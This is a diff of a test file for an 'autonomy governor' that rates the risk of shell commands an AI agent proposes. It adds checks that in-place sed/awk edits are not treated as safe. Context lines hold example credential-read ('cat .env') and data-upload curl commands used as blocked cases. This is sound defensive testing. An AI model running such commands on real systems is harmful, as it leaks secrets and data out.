@@ -46,6 +46,24 @@ describe('autonomy governor', () => {
     }
   })
 
+  test('sed/awk in-place edits are not classified read-only, but plain stdout usage still is', () => {
+    for (const command of [
+      "sed -i 's/a/b/' file.ts",
+      "sed -i.bak 's/a/b/' file.ts",
+      "sed --in-place 's/a/b/' file.ts",
+      "awk -i inplace '{ print }' file.ts",
+    ]) {
+      const result = assessAction({ name: 'run_command', input: { command } }, '/repo')
+      expect(result.risk).not.toBe('safe')
+      expect(result.decision).not.toBe('allow')
+    }
+    for (const command of ["sed 's/a/b/' file.ts", "awk '{ print }' file.ts"]) {
+      const result = assessAction({ name: 'run_command', input: { command } }, '/repo')
+      expect(result.risk).toBe('safe')
+      expect(result.decision).toBe('allow')
+    }
+  })
+
   test('blocks unattended credential reads and outbound data transfer', () => {
     const credentialRead = assessAction({ name: 'run_command', input: { command: 'cat .env' } }, '/repo')
     const externalWrite = assessAction({ name: 'run_command', input: { command: 'curl -X POST https://example.test -d @report.json' } }, '/repo')
